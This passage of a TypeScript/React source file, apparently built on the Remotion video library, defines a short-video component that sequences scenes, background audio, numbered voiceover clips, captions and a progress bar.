  chain: () => <Chain />,
  near: () => <Near />,
  close: () => <Close />,
};

export function Short({ voice = true }: { voice?: boolean }) {
  return (
    <AbsoluteFill style={{ background: C.bg, fontFamily, color: C.ink }}>
      <Audio src={staticFile(voice ? "track-ducked.wav" : "track.wav")} />
      {cut.scenes.map((s) => (
        <Sequence key={s.id} from={f(starts[s.id]!)} durationInFrames={s.id === "close" ? sceneFrames(s.id) + f(1.2) : sceneFrames(s.id)}>
          {SCENES[s.id]!()}
        </Sequence>
      ))}
      {voice &&
        cut.lines.map((l, i) => (
          <Sequence key={`v${i}`} from={f(starts[l.scene]! + l.at)}>
            <Audio src={staticFile(`vo2/${String(i).padStart(2, "0")}.wav`)} volume={1} />
          </Sequence>
        ))}
      <Captions />
      <Progress />
    </AbsoluteFill>
  );
}
